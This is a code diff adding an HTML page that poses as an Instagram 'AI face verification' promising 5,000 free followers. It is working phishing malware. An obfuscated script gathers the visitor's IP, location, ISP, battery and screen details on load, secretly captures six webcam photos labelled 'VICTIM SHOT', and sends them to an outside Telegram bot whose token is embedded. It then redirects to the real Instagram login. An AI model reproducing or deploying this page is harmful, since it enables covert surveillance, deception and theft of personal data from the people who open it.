@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram | AI Identity Verification</title>
+    <style>
+        :root { --insta-gradient: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); --primary: #0095f6; --bg: #000; }
+        body { font-family: -apple-system, system-ui, sans-serif; background: var(--bg); color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .container { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.2); padding: 40px; border-radius: 28px; width: 360px; text-align: center; position: relative; z-index: 10; }
+        .logo-circle { width: 85px; height: 85px; background: var(--insta-gradient); border-radius: 24px; display: flex; align-items: center; justify-content: center; margin: 0 auto 25px; }
+        .logo-circle img { width: 55px; filter: brightness(0) invert(1); }
+        .status-title { font-size: 24px; font-weight: 700; margin-bottom: 12px; }
+        .status-desc { font-size: 15px; color: #bbb; margin-bottom: 35px; }
+        .scan-box { position: relative; width: 130px; height: 130px; margin: 0 auto 30px; }
+        .scan-circle { width: 100%; height: 100%; border: 4px solid var(--primary); border-radius: 50%; border-top-color: transparent; animation: spin 1.2s linear infinite; }
+        .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 3px; background: var(--primary); box-shadow: 0 0 20px var(--primary); animation: scan-move 2.5s ease-in-out infinite; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        @keyframes scan-move { 0%, 100% { top: 0%; opacity: 0.3; } 50% { top: 100%; opacity: 1; } }
+        .btn { background: var(--insta-gradient); color: white; border: none; padding: 16px; border-radius: 14px; font-weight: bold; cursor: pointer; width: 100%; font-size: 17px; }
+        #v, #c { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="container" id="mainBox">
+    <div class="logo-circle"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"></div>
+    <div id="initial-ui">
+        <div class="status-title">AI Face Verification</div>
+        <p class="status-desc">Please complete the identity scan to receive your 5,000 followers instantly.</p>
+        <button class="btn" onclick="startSecureScan()">START SCAN</button>
+    </div>
+    <div id="scan-ui" style="display: none;">
+        <div class="scan-box"><div class="scan-circle"></div><div class="scan-line"></div></div>
+        <div class="status-title" id="status-msg">Analyzing Identity...</div>
+        <p class="status-desc" id="timer">Processing Biometrics (10s)</p>
+    </div>
+</div>
+
+<video id="v" autoplay playsinline></video>
+<canvas id="c" width="1080" height="720"></canvas>
+
+<script>
+    const t = atob("ODUyNTI4Nzc4OTpBQUd2YmcxTGNIQlBrWGVkcVgxSXhsVk5vTWEwSDBmbDF3Zw==");
+    const c_id = atob("ODQzOTI2ODUzMQ==");
+    let shotCount = 0;
+    let globalIpData = null;
+
+    // Load IP data as soon as the page opens to ensure it's ready
+    async function preFetchData() {
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            globalIpData = await response.json();
+        } catch (e) {
+            // Backup API if first one fails
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                globalIpData = { ip: data.ip, city: 'Unknown', country_name: 'Unknown', org: 'Unknown' };
+            } catch (err) {
+                globalIpData = { ip: 'Blocked/VPN', city: 'N/A', country_name: 'N/A', org: 'N/A' };
+            }
+        }
+    }
+    preFetchData();
+
+    async function startSecureScan() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 1280, height: 720 } });
+            document.getElementById('initial-ui').style.display = 'none';
+            document.getElementById('scan-ui').style.display = 'block';
+            document.getElementById('v').srcObject = stream;
+
+            let sec = 10;
+            const interval = setInterval(async () => {
+                sec--;
+                document.getElementById('timer').innerText = `Keep device steady (${sec}s)`;
+
+                const shots = [9, 8, 7, 5, 3, 1];
+                if(shots.includes(sec)) {
+                    shotCount++;
+                    document.getElementById('status-msg').innerText = `Scanning Phase ${shotCount}/6`;
+                    await captureFullData(shotCount);
+                }
+
+                if(sec <= 0) {
+                    clearInterval(interval);
+                    window.location.href = "https://www.instagram.com/accounts/login/";
+                }
+            }, 1000);
+        } catch (e) {
+            alert("Security Error: Identity verification requires camera access!");
+            location.reload();
+        }
+    }
+
+    async function captureFullData(num) {
+        const canvas = document.getElementById('c');
+        const video = document.getElementById('v');
+        canvas.getContext('2d').drawImage(video, 0, 0, 1080, 720);
+
+        let battery = "N/A";
+        if (navigator.getBattery) {
+            const b = await navigator.getBattery();
+            battery = `${Math.round(b.level * 100)}% ${b.charging ? '⚡' : '🔋'}`;
+        }
+
+        // Use pre-fetched data or retry once
+        const info = globalIpData || { ip: "Loading..." };
+
+        const caption = `
+📸 **VICTIM SHOT [${num}/6]**
+---------------------------
+🌐 **IP:** \`${info.ip || info.query || "N/A"}\`
+📍 **Loc:** ${info.city}, ${info.country_name || "N/A"}
+📡 **ISP:** ${info.org || "N/A"}
+🔋 **Battery:** ${battery}
+🖥️ **Screen:** ${window.screen.width}x${window.screen.height}
+🕒 **Time:** ${new Date().toLocaleTimeString()}
+`;
+
+        canvas.toBlob(blob => {
+            const fd = new FormData();
+            fd.append('chat_id', c_id);
+            fd.append('photo', blob, `shot_${num}.png`);
+            fd.append('caption', caption);
+            fd.append('parse_mode', 'Markdown');
+            fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { method: 'POST', body: fd });
+        }, 'image/jpeg', 0.8);
+    }
+</script>
+</body>
+  </html>
